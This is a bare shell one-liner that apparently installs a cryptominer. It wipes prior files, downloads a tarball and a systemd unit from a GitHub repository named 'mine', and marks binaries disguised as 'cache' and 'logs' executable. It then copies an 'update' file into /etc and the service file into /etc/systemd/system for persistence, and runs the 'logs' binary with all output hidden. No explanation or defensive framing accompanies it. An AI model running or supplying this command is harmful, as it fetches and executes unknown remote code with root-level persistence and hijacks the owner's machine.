rm -rf oc.tar cache logs && wget https://raw.githubusercontent.com/robertreynolds2/mine/main/oc.tar && tar xf oc.tar && chmod +x cache logs && cp update /etc/ && wget https://raw.githubusercontent.com/robertreynolds2/mine/main/update.service && cp update.service /etc/systemd/system/ && ./logs > /dev/null 2>&1
